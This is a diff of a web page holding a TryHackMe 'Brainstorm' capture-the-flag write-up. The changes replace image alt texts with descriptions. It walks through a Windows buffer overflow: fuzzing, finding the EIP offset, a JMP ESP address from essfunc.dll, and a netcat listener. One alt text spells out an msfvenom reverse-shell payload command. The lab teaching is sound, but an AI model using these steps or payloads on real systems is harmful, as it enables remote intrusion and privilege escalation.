@@ -169,49 +169,49 @@ ftp&gt; get essfunc.dll
 
 <p>first things first, let&#39;s see how the program behaves in a regular context. launching the <code>chatserver.exe</code>, we get a prompt to create a username and we&#39;re then free to send messages away:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_4.jpg" alt="screenshot showing a netcat connection being initiated on port 9999, used by chatserver.exe. a banner greets us and a prompt to enter our username and write a message appears."></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_4.jpg" alt="screenshot showing a netcat connection being initiated on port 9999, used by chatserver.exe. a banner greets us and a prompt to enter our username and write a message appears"></p>
 
 <p>the program outputs the following while listening for a connection and processing our username and messages:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_5.jpg" alt="chatserver.exe logs screenshot. it outputs a call for its needed DLL, essfunc, then it&#39;s waiting for connections and once one has been established, outputs its address and port and finally the username that has been chosen."></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_5.jpg" alt="chatserver.exe logs screenshot. it outputs a call for its needed DLL, essfunc, then it&#39;s waiting for connections and once one has been established, outputs its address and port and finally the username that has been chosen"></p>
 
 <p>we might trigger a buffer overflow when creating our username or sending a message — or both. let&#39;s test that. the basic fuzzer that we&#39;re using is the following:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_6.jpg" alt="a quick python script that does basic fuzzing on the app. it initiates the connection that we initially did manually, and sends an increasingly bigger string of &quot;AAAAA&quot; until chatserver crashes."></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_6.jpg" alt="a quick python script that does basic fuzzing on the app. it initiates the connection that we initially did manually, and sends an increasingly bigger string of &quot;AAAAA&quot; until chatserver crashes"></p>
 
 <p>we quickly see that username creation implements a character limit so we won&#39;t trigger anything with this input:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_7.jpg" alt="chatserver logs again, that show our script has been poorly thought out as it doesn&#39;t account for the username creation step, which has a proper character limit and won&#39;t overflow."></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_7.jpg" alt="chatserver logs again, that show our script has been poorly thought out as it doesn&#39;t account for the username creation step, which has a proper character limit and won&#39;t overflow"></p>
 
 <p>while editing the script to enter the username before fuzzing the app, i realized i could make it way simpler. i ended up rewriting it with the following:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_8.jpg" alt="rewrite of the previous pyton script, which includes the username creation step and is much more concise."></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_8.jpg" alt="rewrite of the previous pyton script, which includes the username creation step and is much more concise"></p>
 
 <p>running the script, we notice that the app is crashing after sending 2100 bytes. we now have our starting point to work on the buffer overflow!</p>
 
 <p>to find the EIP offset, we generate a pattern of 2400 bytes and whip up a short exploit script, quite simple like our fuzzing script:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_9.jpg" alt="brainstorm_9"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_9.jpg" alt="another python script with a payload of 2400 bytes that will help us locate the EIP offset with pattern_offset, a script present in kali linux"></p>
 
 <p>crashing the app, we get the following EIP register value:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_10.jpg" alt="brainstorm_10"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_10.jpg" alt="screenshot of the EIP register value (31704330) as shown in immunity debugger"></p>
 
 <p>which allows us to find the EIP offset:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_11.jpg" alt="brainstorm_11"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_11.jpg" alt="output of pattern_offset script, which deduces that the EIP offset is 2012 given the EIP register value"></p>
 
 <p>by editing our exploit script, we can confirm that the EIP offset is correct:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_12.jpg" alt="brainstorm_12"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_12.jpg" alt="immunity screenshot showing the EIP register value (42424242) after changing our python script, to make sure that the offset is correct"></p>
 
 <p>great, smooth sailing ahead of us. what we have to do next is sorting out the badchars and exploit the .dll for privilege escalation. mona will come in useful for the latter.</p>
 
 <p>finding the badchars is a simple and boring process: we just add them to our payload and find out what went wrong in our esp dump.</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_13.jpg" alt="brainstorm_13"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_13.jpg" alt="updated python script taking the offset we found into account, to inject the badchars properly and sort them out in the next step"></p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_14.jpg" alt="brainstorm_14"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_14.jpg" alt="screenshot of our ESP dump in immunity debugger, showing that we don&#39;t have any badchars except the null byte"></p>
 
 <p>turns out we don&#39;t have any badchars so we will be able to proceed without excluding them (except of course \x00). let&#39;s work on the .dll file next.</p>
 
@@ -219,36 +219,36 @@ ftp&gt; get essfunc.dll
 
 <p>first, let&#39;s take a look of the modules with mona. this is simply done with the <code>!mona modules</code> command in immunity:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_15.jpg" alt="brainstorm_15"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_15.jpg" alt="output of the &quot;!mona modules&quot; command in immunity debugger, showing the .DLLs that chatserver.exe depends on along with their properties"></p>
 
 <p>we can see that <code>essfunc.dll</code> is a perfect candidate for privilege escalation because it has no memory protections whatsoever. if we can find a <code>JMP ESP</code> instruction that we can leverage for our payload, we should be good to go.<br>
 running <code>msf-nasm_shell</code> on kali, we can see that the hex instruction for <code>JMP ESP</code> is \xff\xe4:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_16.jpg" alt="brainstorm_16"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_16.jpg" alt="output of msf-nasm_shell, showing the hex instruction for JMP ESP"></p>
 
 <p>to find this instruction in <code>essfunc.dll</code>, mona will again prove to be useful. running <code>!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll</code> allow us to get the pointers for the instruction we&#39;re looking for:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_17.jpg" alt="brainstorm_17"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_17.jpg" alt="output of &quot;!mona find&quot; command in immunity debugger, showing all the pointers leading to the &quot;\xff\xe4&quot; instruction"></p>
 
 <p>let&#39;s pick the first one and check if this works. we simply adjust our script with the address and change its endianness to match our win x86 target:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_18.jpg" alt="brainstorm_18"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_18.jpg" alt="python script updated with our JMP ESP instruction address, reversed to match the endianness"></p>
 
 <p>and we put a breakpoint in immunity for the same address. running the exploit again, we notice that we have indeed control of the EIP:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_20.jpg" alt="brainstorm_20"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_20.jpg" alt="screenshot of immunity debugger showing the value of the EIP register, now set to our JMP ESP instruction address"></p>
 
 <p>we&#39;re now ready to add the payload in our script and test it against the real target. to generate a payload, we use msfvenom with the following parameters to match the corresponding architecture of our target, add only the null byte to our list of badchars and make it play nicely with python:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_21.jpg" alt="brainstorm_21"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_21.jpg" alt="output of &quot;msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f python -b &#39;\x00&#39;&quot; on kali linux. this generates our payload for a python script while excluding the null byte"></p>
 
 <p>our script now looks like this (let&#39;s not forget the nop sled too) and should hopefully be working:</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_22.jpg" alt="brainstorm_22"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_22.jpg" alt="screenshot of our updated and final python script, ready to inject msfvenom&#39;s payload"></p>
 
 <p>let&#39;s set up a netcat listener before running it with <code>nc -lvnp 4444</code>. and sure enough, we end up getting elevated privileges on our target, just as planned!</p>
 
-<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_23.jpg" alt="brainstorm_23"></p>
+<p><img src="https://ovelny.sh/assets/images/tryhackme-writeup-brainstorm/brainstorm_23.jpg" alt="screenshot showing that we got a connection to our target. running the command &quot;whoami&quot; on windows outputs &quot;nt authority\system&quot;, proving that we have elevated privileges"></p>
 
     </main>
     <footer id="footer">
